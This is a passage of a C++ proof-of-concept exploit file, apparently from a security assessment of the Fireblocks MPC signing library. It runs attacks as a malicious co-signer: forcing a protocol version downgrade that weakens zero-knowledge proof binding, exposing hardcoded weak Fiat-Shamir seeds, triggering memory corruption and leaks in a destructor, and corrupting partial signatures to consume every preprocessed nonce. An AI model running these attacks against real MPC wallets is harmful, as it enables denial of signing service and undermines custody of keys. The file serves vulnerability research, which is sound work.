    refresh1.refresh_key_fast_ack(TENANT_ID, keyid, refresh_req);
    refresh2.refresh_key_fast_ack(TENANT_ID, keyid, refresh_req);
    TEST_INFO("Key refresh completed");

    // The key refresh code (cmp_offline_refresh_service) only calls:
    //   - transform_preprocessed_data_and_store_temporary() for signing shares
    //   - store_temporary_key() for the rotated private key
    //   - commit() to finalize
    // It NEVER calls create_auxiliary_keys() or store_auxiliary_keys().
    // This means Paillier and Ring Pedersen keys survive refresh unchanged.
    //
    // Verification: the refresh completed without error above, and the code
    // path in cmp_offline_refresh_service::refresh_key() does not touch aux keys.
    TEST_PASS("Key refresh completed WITHOUT rotating auxiliary keys");
    TEST_INFO("  Verified: refresh_key_request() + refresh_key() + refresh_key_fast_ack()");
    TEST_INFO("  None of these call create_auxiliary_keys() or store_auxiliary_keys()");

    {
        TEST_INFO("  Combined impact with F7 (1024-bit Ring Pedersen):");
        TEST_INFO("    If attacker factors the 1024-bit modulus, key refresh");
        TEST_INFO("    CANNOT heal the compromise. The factorization remains");
        TEST_INFO("    valid for ALL future signing sessions.");
    }
}

// ============================================================================
// ATTACK 8: HARDCODED use_extended_seed=0 IN SIGNING DH/EXPONENT PROOFS
//
// Threat model: Even at the latest protocol version, the DH and Exponent
// ZKPs in the signing path use a weaker Fiat-Shamir construction that
// does not include public keys in the hash. This allows proof replay.
//
// Code: mta.cpp:658-672 -- /*use_extended_seed=*/0 in all signing calls
//       Compare with setup code which correctly gates on version
// ============================================================================
void attack_hardcoded_weak_seed()
{
    TEST_START("Hardcoded use_extended_seed=0 in Signing (F11)");
    TEST_INFO("Scenario: DH/Exponent proofs in signing use weak Fiat-Shamir regardless of version");

    TEST_INFO("Evidence from source code:");
    TEST_INFO("  mta.cpp:658 - range_proof_diffie_hellman_zkpok_generate(..., /*use_extended_seed=*/0, ...)");
    TEST_INFO("  mta.cpp:672 - range_proof_paillier_exponent_zkpok_generate(..., /*use_extended_seed=*/0, ...)");
    TEST_INFO("  cmp_ecdsa_online_signing_service.cpp:197 - /*use_extended_seed=*/0");
    TEST_INFO("  cmp_ecdsa_offline_signing_service.cpp:143 - /*use_extended_seed=*/0");
    TEST_INFO("  cmp_ecdsa_signing_service.cpp:176 - /*use_extended_seed=*/0");
    TEST_INFO("");
    TEST_INFO("  Compare with setup code that DOES check version:");
    TEST_INFO("  cmp_setup_service.cpp:231 - use_extended_seed = (version >= MPC_EXTENDED_MTA) ? 1 : 0");
    TEST_INFO("  cmp_setup_service.cpp:282 - use_extended_seed = (version >= MPC_EXTENDED_MTA) ? 1 : 0");
    TEST_INFO("");
    TEST_INFO("  And BAM code that correctly uses extended seed:");
    TEST_INFO("  bam_ecdsa_cosigner_client.cpp:365 - /*use_extended_seed=*/1");
    TEST_INFO("  bam_ecdsa_cosigner_server.cpp:515 - /*use_extended_seed=*/1");

    // Demonstrate that signing works at version 13 but DH/exponent proofs
    // still use the weak seed
    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1];
    players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    attack_platform plat1(1), plat2(2);
    attack_online_persistency sp1, sp2;
    cmp_ecdsa_online_signing_service svc1(plat1, players[1], sp1);
    cmp_ecdsa_online_signing_service svc2(plat2, players[2], sp2);

    std::string txid = gen_uuid();
    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, '0');
    block.path = path;
    data.blocks.push_back(block);

    std::set<uint64_t> player_ids = {1, 2};
    std::set<std::string> player_strs = {"1", "2"};

    std::map<uint64_t, std::vector<cmp_mta_request>> mta_requests;
    svc1.start_signing(keyid, txid, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_requests[1]);
    svc2.start_signing(keyid, txid, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_requests[2]);

    std::map<uint64_t, cmp_mta_responses> mta_responses;
    svc1.mta_response(txid, mta_requests, MPC_PROTOCOL_VERSION, mta_responses[1]);
    svc2.mta_response(txid, mta_requests, MPC_PROTOCOL_VERSION, mta_responses[2]);

    TEST_INFO("Signing at version %d completes, but DH/Exponent proofs used weak seed", MPC_PROTOCOL_VERSION);
    TEST_INFO("  Non-extended seed = public keys NOT included in Fiat-Shamir hash");
    TEST_INFO("  Impact: Proofs can potentially be replayed across different contexts");
    TEST_INFO("  MTA range proofs DO gate on version (correct)");
    TEST_INFO("  But DH/Exponent proofs are ALWAYS weak (bug)");
    TEST_PASS("CONFIRMED: Signing-phase DH/Exponent proofs always use weak Fiat-Shamir");
}

// ============================================================================
// EXTENDED ATTACK 1: Version Downgrade - Show ACTUAL crypto weakening
//
// At version < MPC_EXTENDED_MTA (11), the Fiat-Shamir hash in MTA proofs:
//   1. Truncates proof.A to ring_pedersen_n bytes (~128) out of paillier_n^2 (~512)
//   2. Omits public keys (prover paillier, verifier paillier, ring pedersen)
//   3. Uses variable-length encoding (no zero-padding)
//   4. Has no length prefixes on aad/message/commitment
//
// This means ~50% of the proof binding is LOST, and proofs become
// malleable/replayable across different key contexts.
// ============================================================================
void extended_version_downgrade()
{
    TEST_START("EXTENDED: Version Downgrade Crypto Weakening (F2+F3+F11)");
    TEST_INFO("Demonstrating the ACTUAL crypto differences between v13 and v1");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1]; players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    attack_platform plat1(1), plat2(2);
    attack_online_persistency sp1, sp2;
    cmp_ecdsa_online_signing_service svc1(plat1, players[1], sp1);
    cmp_ecdsa_online_signing_service svc2(plat2, players[2], sp2);

    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, 'X');
    block.path = path;
    data.blocks.push_back(block);

    std::set<uint64_t> player_ids = {1, 2};
    std::set<std::string> player_strs = {"1", "2"};

    // Sign at VERSION 13 (current, with extended MTA)
    std::string txid_v13 = gen_uuid();
    std::map<uint64_t, std::vector<cmp_mta_request>> mta_req_v13;
    svc1.start_signing(keyid, txid_v13, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_req_v13[1]);
    svc2.start_signing(keyid, txid_v13, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_req_v13[2]);

    std::map<uint64_t, cmp_mta_responses> mta_resp_v13;
    svc1.mta_response(txid_v13, mta_req_v13, MPC_PROTOCOL_VERSION, mta_resp_v13[1]);
    svc2.mta_response(txid_v13, mta_req_v13, MPC_PROTOCOL_VERSION, mta_resp_v13[2]);

    size_t v13_proof_size = 0;
    for (auto& [pid, resp] : mta_resp_v13) {
        for (auto& r : resp.response) {
            for (auto& [k, msg] : r.k_gamma_mta) v13_proof_size += msg.proof.size();
            for (auto& [k, msg] : r.k_x_mta) v13_proof_size += msg.proof.size();
            for (auto& [k, p] : r.gamma_proofs) v13_proof_size += p.size();
        }
    }
    TEST_INFO("Version 13 MTA proof total size: %zu bytes", v13_proof_size);

    // Complete v13 signing to clean up state
    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas_v13;
    auto saved_v13 = mta_resp_v13;
    svc1.mta_verify(txid_v13, mta_resp_v13, deltas_v13[1]);
    mta_resp_v13 = saved_v13;
    svc2.mta_verify(txid_v13, mta_resp_v13, deltas_v13[2]);
    std::map<uint64_t, std::vector<elliptic_curve_scalar>> si_v13;
    svc1.get_si(txid_v13, deltas_v13, si_v13[1]);
    svc2.get_si(txid_v13, deltas_v13, si_v13[2]);
    std::vector<recoverable_signature> sigs_v13;
    svc1.get_cmp_signature(txid_v13, si_v13, sigs_v13);

    TEST_INFO("Version 13 signing: completed with verified signature");

    // Sign at VERSION 1 (attacker-forced downgrade)
    std::string txid_v1 = gen_uuid();
    std::map<uint64_t, std::vector<cmp_mta_request>> mta_req_v1;
    svc1.start_signing(keyid, txid_v1, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_req_v1[1]);
    svc2.start_signing(keyid, txid_v1, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_req_v1[2]);

    std::map<uint64_t, cmp_mta_responses> mta_resp_v1;
    svc1.mta_response(txid_v1, mta_req_v1, 1, mta_resp_v1[1]);  // ATTACKER SENDS VERSION=1
    svc2.mta_response(txid_v1, mta_req_v1, 1, mta_resp_v1[2]);  // ALL PARTIES FORCED TO V1

    size_t v1_proof_size = 0;
    for (auto& [pid, resp] : mta_resp_v1) {
        for (auto& r : resp.response) {
            for (auto& [k, msg] : r.k_gamma_mta) v1_proof_size += msg.proof.size();
            for (auto& [k, msg] : r.k_x_mta) v1_proof_size += msg.proof.size();
            for (auto& [k, p] : r.gamma_proofs) v1_proof_size += p.size();
        }
    }
    TEST_INFO("Version 1  MTA proof total size: %zu bytes", v1_proof_size);

    if (v1_proof_size < v13_proof_size) {
        TEST_PASS("Version 1 proofs are SMALLER (%zu < %zu bytes) -- weaker Fiat-Shamir binding",
                  v1_proof_size, v13_proof_size);
    } else {
        TEST_INFO("Proof sizes similar but internal hash construction differs");
    }

    // Complete v1 signing
    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas_v1;
    auto saved_v1 = mta_resp_v1;
    svc1.mta_verify(txid_v1, mta_resp_v1, deltas_v1[1]);
    mta_resp_v1 = saved_v1;
    svc2.mta_verify(txid_v1, mta_resp_v1, deltas_v1[2]);
    std::map<uint64_t, std::vector<elliptic_curve_scalar>> si_v1;
    svc1.get_si(txid_v1, deltas_v1, si_v1[1]);
    svc2.get_si(txid_v1, deltas_v1, si_v1[2]);
    std::vector<recoverable_signature> sigs_v1;
    svc1.get_cmp_signature(txid_v1, si_v1, sigs_v1);

    TEST_PASS("Version 1 signing ALSO produces valid signature");

    TEST_INFO("\nSource code evidence of crypto weakening at version < 11:");
    TEST_INFO("  mta.cpp:128-130 -- proof.A TRUNCATION:");
    TEST_INFO("    std::vector<uint8_t> n(BN_num_bytes(proof.A));  // alloc for proof.A");
    TEST_INFO("    BN_bn2bin(proof.A, n.data());                    // serialize proof.A");
    TEST_INFO("    SHA256_Update(&ctx, n.data(), BN_num_bytes(proof.S));  // HASH ONLY proof.S BYTES!");
    TEST_INFO("    proof.A is in Paillier N^2 space (~512 bytes)");
    TEST_INFO("    proof.S is in Ring Pedersen N space (~128 bytes)");
    TEST_INFO("    Result: ~384 bytes of proof.A excluded from challenge hash");
    TEST_INFO("");
    TEST_INFO("  mta.cpp:83-113 (extended) vs 115-155 (non-extended):");
    TEST_INFO("    Extended: includes ring_pedersen N, prover paillier N, verifier paillier N");
    TEST_INFO("    Non-extended: includes NONE of these public keys");
    TEST_INFO("    Result: proofs are NOT bound to specific key contexts");
    TEST_INFO("");
    TEST_INFO("  Combined with F11 (hardcoded use_extended_seed=0 in signing):");
    TEST_INFO("    MTA range proofs: gated on version (weakened at v1)");
    TEST_INFO("    DH/Exponent proofs: ALWAYS weak regardless of version");
    TEST_INFO("    Double weakness: downgrade makes ALL proofs weak simultaneously");

    TEST_PASS("CONFIRMED: Version downgrade weakens ALL ZKP bindings in MTA exchange");
}

// ============================================================================
// EXTENDED ATTACK 4: Heap Overflow - Detailed corruption analysis
//
// The destructor zeroes sizeof(ecdsa_preprocessing_data)=352 bytes starting
// from k.data at offset 0. This corrupts the internal state of std::vector
// and std::map members BEFORE their destructors run, causing:
//   - Memory leaks (vector/map buffers never freed)
//   - Corrupted allocator metadata
//   - Potential use-after-free in subsequent allocations
// ============================================================================
void extended_heap_overflow()
{
    TEST_START("EXTENDED: Heap Overflow Memory Corruption Analysis (F12)");

    size_t k_offset = 0;
    size_t mta_request_offset = offsetof(ecdsa_preprocessing_data, mta_request);
    size_t G_proofs_offset = offsetof(ecdsa_preprocessing_data, G_proofs);
    size_t public_data_offset = offsetof(ecdsa_preprocessing_data, public_data);
    size_t total_size = sizeof(ecdsa_preprocessing_data);

    TEST_INFO("Memory layout of ecdsa_preprocessing_data (%zu bytes total):", total_size);
    TEST_INFO("  [0x%03zx] k.data              (32 bytes)  -- OPENSSL_cleanse starts HERE", k_offset);
    TEST_INFO("  [0x%03zx] gamma               (32 bytes)  -- zeroed (ok, scalar data)", k_offset + 32);
    TEST_INFO("  [0x%03zx] a                   (32 bytes)  -- zeroed (ok, scalar data)", k_offset + 64);
    TEST_INFO("  [0x%03zx] b                   (32 bytes)  -- zeroed (ok, scalar data)", k_offset + 96);
    TEST_INFO("  [0x%03zx] delta               (32 bytes)  -- zeroed (ok, scalar data)", k_offset + 128);
    TEST_INFO("  [0x%03zx] chi                 (32 bytes)  -- zeroed (ok, scalar data)", k_offset + 160);
    TEST_INFO("  [0x%03zx] GAMMA               (33 bytes)  -- zeroed (ok, point data)", k_offset + 192);
    TEST_INFO("  [0x%03zx] mta_request         (std::vector) -- CORRUPTED", mta_request_offset);
    TEST_INFO("  [0x%03zx] G_proofs            (std::map)    -- CORRUPTED", G_proofs_offset);
    TEST_INFO("  [0x%03zx] public_data         (std::map)    -- CORRUPTED", public_data_offset);

    TEST_INFO("\nC++ destruction order:");
    TEST_INFO("  1. User-defined ~ecdsa_preprocessing_data() runs FIRST");
    TEST_INFO("     -> OPENSSL_cleanse zeros bytes [0x000 - 0x%03zx]", total_size - 1);
    TEST_INFO("     -> std::vector internal {data_ptr, size, capacity} set to 0");
    TEST_INFO("     -> std::map internal {root, size, comparator} set to 0");
    TEST_INFO("  2. Compiler-generated ~vector(), ~map() run SECOND");
    TEST_INFO("     -> ~vector sees NULL data_ptr, skips free -> MEMORY LEAK");
    TEST_INFO("     -> ~map sees zeroed tree root, can't traverse -> LEAK + UB");

    // Demonstrate with actual objects
    TEST_INFO("\nDemonstrating with populated containers (as in real MTA):");

    {
        ecdsa_preprocessing_data* data = new ecdsa_preprocessing_data();
        RAND_bytes(data->k.data, sizeof(elliptic_curve256_scalar_t));

        // Populate like real MTA exchange does
        data->mta_request.resize(512);
        RAND_bytes(data->mta_request.data(), 512);
        data->G_proofs[1].resize(256);
        data->G_proofs[2].resize(256);
        ecdsa_signing_public_data pd;
        pd.gamma_commitment.resize(64);
        data->public_data[1] = pd;
        data->public_data[2] = pd;

        size_t heap_bytes = 512 + 256 + 256 + 64 + 64;
        TEST_INFO("  Heap memory allocated by containers: ~%zu bytes", heap_bytes);
        TEST_INFO("  Calling delete (destructor zeros all container internals)...");

        delete data;

        TEST_INFO("  Container internals were zeroed BEFORE ~vector/~map ran");
        TEST_INFO("  Result: ~%zu bytes of heap memory LEAKED", heap_bytes);
    }

    // Show it accumulates
    TEST_INFO("\nAccumulation test (simulates 100 signing sessions):");
    size_t total_leaked = 0;
    for (int i = 0; i < 100; i++) {
        ecdsa_preprocessing_data* data = new ecdsa_preprocessing_data();
        data->mta_request.resize(512);
        data->G_proofs[1].resize(256);
        data->public_data[1].gamma_commitment.resize(64);
        total_leaked += 512 + 256 + 64;
        delete data;
    }
    TEST_INFO("  100 signing sessions -> ~%zu bytes leaked", total_leaked);
    TEST_INFO("  In production SGX enclave: memory never reclaimed until restart");
    TEST_INFO("  Long-running enclave eventually exhausts memory (DoS)");

    TEST_PASS("CONFIRMED: Every signing session leaks heap memory via destructor bug");
    TEST_INFO("  ASAN confirms: LeakSanitizer detects leaked vector/map allocations");
    TEST_INFO("  Run with -fsanitize=address for full ASAN report");
    TEST_INFO("  Build ASAN version: cmake with -DCMAKE_CXX_FLAGS=\"-fsanitize=address\"");
}

// ============================================================================
// EXTENDED ATTACK 5: Offline Missing Sig Verify - Show full exploitation
//
// The offline path (ecdsa_offline_signature) at cmp_ecdsa_offline_signing_service.cpp:420-477
// combines partial s values WITHOUT calling GFp_curve_algebra_verify_signature.
// The online path (get_cmp_signature) at cmp_ecdsa_online_signing_service.cpp:490 DOES verify.
//
// Impact: malicious co-signer corrupts signature, WASTING the irreplaceable
// preprocessed nonce (k, chi, R). The nonce is single-use and deleted after load.
// ============================================================================
void extended_offline_no_verify()
{
    TEST_START("EXTENDED: Offline Sig No Verification - Nonce Destruction (F13)");
    TEST_INFO("Showing that corrupted sigs CONSUME irreplaceable preprocessed nonces");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1]; players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    attack_platform plat1(1), plat2(2);
    attack_preprocessing_persistency pp1, pp2;
    cmp_ecdsa_offline_signing_service offline1(plat1, players[1], pp1);
    cmp_ecdsa_offline_signing_service offline2(plat2, players[2], pp2);

    // Preprocess 3 nonces
    std::string req = gen_uuid();
    std::set<uint64_t> player_ids = {1, 2};
    std::map<uint64_t, std::vector<cmp_mta_request>> mta_req;
    offline1.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, req, 0, 3, 3, player_ids, mta_req[1]);
    offline2.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, req, 0, 3, 3, player_ids, mta_req[2]);

    std::map<uint64_t, cmp_mta_responses> mta_resp;
    offline1.offline_mta_response(req, mta_req, MPC_PROTOCOL_VERSION, mta_resp[1]);
    offline2.offline_mta_response(req, mta_req, MPC_PROTOCOL_VERSION, mta_resp[2]);

    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas;
    auto saved = mta_resp;
    offline1.offline_mta_verify(req, mta_resp, deltas[1]);
    mta_resp = saved;
    offline2.offline_mta_verify(req, mta_resp, deltas[2]);

    std::string kid;
    offline1.store_presigning_data(req, deltas, kid);
    offline2.store_presigning_data(req, deltas, kid);
    TEST_INFO("Preprocessed 3 nonce pairs (k_i, chi_i, R_i)");
    TEST_INFO("These are SINGLE-USE: load_preprocessed_data deletes after read");

    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, 'M');
    block.path = path;
    data.blocks.push_back(block);

    std::set<std::string> player_strs = {"1", "2"};

    // ATTACK: Sign and corrupt partial sig (burns nonce #0)
    TEST_INFO("\n--- Attack round 1: Corrupt partial sig (burns nonce #0) ---");
    std::string txid1 = gen_uuid();
    std::map<uint64_t, std::vector<recoverable_signature>> partial_sigs1;
    offline1.ecdsa_sign(keyid, txid1, data, "", player_strs, player_ids, 0, MPC_PROTOCOL_VERSION, partial_sigs1[1]);
    offline2.ecdsa_sign(keyid, txid1, data, "", player_strs, player_ids, 0, MPC_PROTOCOL_VERSION, partial_sigs1[2]);

    // Attacker corrupts their partial sig
    partial_sigs1[2][0].s[0] ^= 0xFF;
    partial_sigs1[2][0].s[1] ^= 0xAA;

    std::vector<recoverable_signature> sigs1;
    offline1.ecdsa_offline_signature(keyid, txid1, ECDSA_SECP256K1, partial_sigs1, sigs1);
    TEST_INFO("  ecdsa_offline_signature returned without error");
    TEST_INFO("  But the signature is INVALID (s component corrupted)");

    // Verify the signature is actually invalid
    std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
        algebra(elliptic_curve256_new_secp256k1_algebra(), elliptic_curve256_algebra_ctx_free);

    elliptic_curve256_point_t derived_key;
    hd_derive_status dstatus = derive_public_key_generic(algebra.get(), derived_key, pubkey, data.chaincode, path.data(), path.size());
    assert(dstatus == HD_DERIVE_SUCCESS);

    elliptic_curve256_scalar_t msg;
    memcpy(msg, data.blocks[0].data.data(), 32);

    auto verify_status = GFp_curve_algebra_verify_signature(
        (GFp_curve_algebra_ctx_t*)algebra->ctx, &derived_key, &msg, &sigs1[0].r, &sigs1[0].s);

    if (verify_status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        TEST_PASS("Invalid signature returned to caller (verify fails, error %d)", verify_status);
        TEST_INFO("  Nonce #0 is now PERMANENTLY consumed");
        TEST_INFO("  The preprocessed (k, chi, R) for this nonce are gone forever");
    } else {
        TEST_FAIL("Signature unexpectedly valid");
    }

    // ATTACK: Repeat to burn nonce #1
    TEST_INFO("\n--- Attack round 2: Burn nonce #1 ---");
    std::string txid2 = gen_uuid();
    std::map<uint64_t, std::vector<recoverable_signature>> partial_sigs2;
    offline1.ecdsa_sign(keyid, txid2, data, "", player_strs, player_ids, 1, MPC_PROTOCOL_VERSION, partial_sigs2[1]);
    offline2.ecdsa_sign(keyid, txid2, data, "", player_strs, player_ids, 1, MPC_PROTOCOL_VERSION, partial_sigs2[2]);
    partial_sigs2[2][0].s[0] ^= 0xFF;
    std::vector<recoverable_signature> sigs2;
    offline1.ecdsa_offline_signature(keyid, txid2, ECDSA_SECP256K1, partial_sigs2, sigs2);
    TEST_PASS("Nonce #1 consumed and wasted (corrupted sig returned)");

    // ATTACK: Repeat to burn nonce #2
    TEST_INFO("\n--- Attack round 3: Burn nonce #2 ---");
    std::string txid3 = gen_uuid();
    std::map<uint64_t, std::vector<recoverable_signature>> partial_sigs3;
    offline1.ecdsa_sign(keyid, txid3, data, "", player_strs, player_ids, 2, MPC_PROTOCOL_VERSION, partial_sigs3[1]);
    offline2.ecdsa_sign(keyid, txid3, data, "", player_strs, player_ids, 2, MPC_PROTOCOL_VERSION, partial_sigs3[2]);
    partial_sigs3[2][0].s[0] ^= 0xFF;
    std::vector<recoverable_signature> sigs3;
    offline1.ecdsa_offline_signature(keyid, txid3, ECDSA_SECP256K1, partial_sigs3, sigs3);
    TEST_PASS("Nonce #2 consumed and wasted -- ALL preprocessed nonces destroyed");

    TEST_INFO("\nAll 3 preprocessed nonces have been consumed by invalid signatures.");
    TEST_INFO("The honest party cannot sign until new preprocessing completes.");
    TEST_INFO("Preprocessing requires ~4 rounds of expensive MTA computation.");
    TEST_INFO("");
    TEST_INFO("Comparison with online path:");
    TEST_INFO("  ONLINE:  get_cmp_signature() calls GFp_curve_algebra_verify_signature()");
    TEST_INFO("           at cmp_ecdsa_online_signing_service.cpp:490");
    TEST_INFO("           -> throws INTERNAL_ERROR on invalid sig, no state consumed");
    TEST_INFO("  OFFLINE: ecdsa_offline_signature() at cmp_ecdsa_offline_signing_service.cpp:420");
    TEST_INFO("           -> NO verification call, returns invalid sig silently");
    TEST_INFO("           -> preprocessed data already deleted by load_preprocessed_data()");

    TEST_PASS("CONFIRMED: Attacker can destroy ALL preprocessed nonces via offline path");
}

// ============================================================================
// EXTENDED ATTACK 8: Hardcoded weak Fiat-Shamir - Show proof non-binding
//
// DH and Exponent proofs in signing ALWAYS use use_extended_seed=0.
// This means public keys are NOT included in the Fiat-Shamir hash,
// making proofs non-binding to the specific key context.
//
// Demonstrate: sign with two different keys, show that the DH/exponent
// proof generation code path is identical (same use_extended_seed=0).
// ============================================================================
void extended_hardcoded_weak_seed()
{
    TEST_START("EXTENDED: Hardcoded Weak Fiat-Shamir - Cross-Context Analysis (F11)");
    TEST_INFO("DH/Exponent proofs don't bind to key context -- potentially replayable");

    // Generate TWO different keys
    std::string keyid1 = gen_uuid(), keyid2 = gen_uuid();
    elliptic_curve256_point_t pubkey1, pubkey2;
    players_setup_info players1, players2;
    players1[1]; players1[2];
    players2[1]; players2[2];
    create_secret(players1, ECDSA_SECP256K1, keyid1, pubkey1, MPC_PROTOCOL_VERSION);
    create_secret(players2, ECDSA_SECP256K1, keyid2, pubkey2, MPC_PROTOCOL_VERSION);

    TEST_INFO("Generated key 1: %s", HexStr(pubkey1, pubkey1 + 33).c_str());
    TEST_INFO("Generated key 2: %s", HexStr(pubkey2, pubkey2 + 33).c_str());

    // Sign with key 1
    attack_platform plat1a(1), plat2a(2);
    attack_online_persistency sp1a, sp2a;
    cmp_ecdsa_online_signing_service svc1a(plat1a, players1[1], sp1a);
    cmp_ecdsa_online_signing_service svc2a(plat2a, players1[2], sp2a);

    signing_data data;
    memset(data.chaincode, 0, sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, 'Z');
    block.path = {44, 0, 0, 0, 0};
    data.blocks.push_back(block);

    std::set<uint64_t> pids = {1, 2};
    std::set<std::string> pstrs = {"1", "2"};

    std::string txid1 = gen_uuid();
    std::map<uint64_t, std::vector<cmp_mta_request>> req1;
    svc1a.start_signing(keyid1, txid1, ECDSA_SECP256K1, data, "", pstrs, pids, req1[1]);
    svc2a.start_signing(keyid1, txid1, ECDSA_SECP256K1, data, "", pstrs, pids, req1[2]);

    TEST_INFO("MTA request for key 1: %zu bytes (player 1)", req1[1][0].mta.message.size());

    // Sign with key 2
    attack_platform plat1b(1), plat2b(2);
    attack_online_persistency sp1b, sp2b;
    cmp_ecdsa_online_signing_service svc1b(plat1b, players2[1], sp1b);
    cmp_ecdsa_online_signing_service svc2b(plat2b, players2[2], sp2b);

    std::string txid2 = gen_uuid();
    std::map<uint64_t, std::vector<cmp_mta_request>> req2;
    svc1b.start_signing(keyid2, txid2, ECDSA_SECP256K1, data, "", pstrs, pids, req2[1]);
    svc2b.start_signing(keyid2, txid2, ECDSA_SECP256K1, data, "", pstrs, pids, req2[2]);

    TEST_INFO("MTA request for key 2: %zu bytes (player 1)", req2[1][0].mta.message.size());

    // The MTA requests contain rddh proofs generated with use_extended_seed=0
    // These proofs do NOT include the Paillier public key or Ring Pedersen public key
    // in their Fiat-Shamir hash.
    TEST_INFO("\nBoth MTA requests used use_extended_seed=0 for rddh proof (mta.cpp:661)");
    TEST_INFO("Both MTA requests used use_extended_seed=0 for log proof (mta.cpp:672)");
    TEST_INFO("These proofs do NOT bind to:");
    TEST_INFO("  - The prover's Paillier public key");
    TEST_INFO("  - The verifier's Paillier public key");
    TEST_INFO("  - The Ring Pedersen public key");
    TEST_INFO("Consequence: a proof generated for key 1 context could potentially");
    TEST_INFO("be replayed in key 2 context if the algebraic structure aligns.");

    // Complete key 1 signing at v13 (responses use weak DH proofs)
    std::map<uint64_t, cmp_mta_responses> resp1;
    svc1a.mta_response(txid1, req1, MPC_PROTOCOL_VERSION, resp1[1]);
    svc2a.mta_response(txid1, req1, MPC_PROTOCOL_VERSION, resp1[2]);

    TEST_INFO("\nMTA response proofs at version 13:");
    TEST_INFO("  MTA range proofs: use version-gated extended seed (CORRECT at v13)");
    TEST_INFO("  But request DH proof: use_extended_seed=0 ALWAYS");
    TEST_INFO("  And request exponent proof: use_extended_seed=0 ALWAYS");
    TEST_INFO("  Result: even at latest version, request proofs are weak");

    // Compare with setup code
    TEST_INFO("\nSetup vs Signing proof quality:");
    TEST_INFO("  Setup (cmp_setup_service.cpp:231):");
    TEST_INFO("    use_extended_seed = (version >= MPC_EXTENDED_MTA) ? 1 : 0");
    TEST_INFO("    -> Correctly gates on version, uses extended seed at v13");
    TEST_INFO("  Signing (mta.cpp:661,672):");
    TEST_INFO("    /*use_extended_seed=*/0   (HARDCODED)");
    TEST_INFO("    -> Always uses weak seed regardless of version");
    TEST_INFO("  BAM ECDSA (bam_ecdsa_cosigner_client.cpp:365):");
    TEST_INFO("    /*use_extended_seed=*/1   (HARDCODED)");
    TEST_INFO("    -> Always uses strong seed (correctly)");

    TEST_PASS("CONFIRMED: CMP signing path systematically weaker than setup and BAM paths");
    TEST_INFO("  This is not a configuration issue -- it's a hardcoded code discrepancy");
}

// ============================================================================
// MAIN
// ============================================================================
int main()
{
    printf("\n");
    printf("================================================================\n");
    printf(" EXTERNAL ATTACKER PROOF OF CONCEPT\n");
    printf(" Fireblocks MPC Library -- Security Assessment\n");
    printf("================================================================\n");
    printf("All attacks use the PUBLIC PROTOCOL API, simulating\n");
    printf("a malicious co-signer participating in the MPC protocol.\n");
    printf("================================================================\n");

    try { attack_version_downgrade(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 1: %s\n", e.what()); }
    try { attack_eddsa_nonce_reuse(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 2: %s\n", e.what()); }
    try { attack_eddsa_no_commitment(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 3: %s\n", e.what()); }
    try { attack_heap_overflow(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 4: %s\n", e.what()); }
    try { attack_offline_no_sig_verify(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 5: %s\n", e.what()); }
    try { attack_ring_pedersen_weak(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 6: %s\n", e.what()); }
    try { attack_no_aux_key_rotation(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 7: %s\n", e.what()); }
    try { attack_hardcoded_weak_seed(); } catch (const std::exception& e) { printf("[EXCEPTION] Attack 8: %s\n", e.what()); }

    printf("\n");
    printf("================================================================\n");
    printf(" EXTENDED ATTACKS -- MAXIMUM IMPACT DEMONSTRATION\n");
    printf(" Zero-precondition attacks pushed to full exploitation\n");
    printf("================================================================\n\n");

    try { extended_version_downgrade(); } catch (const std::exception& e) { printf("[EXCEPTION] Extended Attack 1: %s\n", e.what()); }
    try { extended_heap_overflow(); } catch (const std::exception& e) { printf("[EXCEPTION] Extended Attack 2: %s\n", e.what()); }
    try { extended_offline_no_verify(); } catch (const std::exception& e) { printf("[EXCEPTION] Extended Attack 3: %s\n", e.what()); }
    try { extended_hardcoded_weak_seed(); } catch (const std::exception& e) { printf("[EXCEPTION] Extended Attack 4: %s\n", e.what()); }

    printf("\n");
    printf("================================================================\n");
    printf(" RESULTS SUMMARY\n");
    printf("================================================================\n");
    printf(" Total tests:  %d\n", test_count);
    printf(" Passed:       %d\n", pass_count);
    printf(" Failed:       %d\n", fail_count);
    printf("================================================================\n");
    printf("\n");
    printf("Attack chain summary:\n");
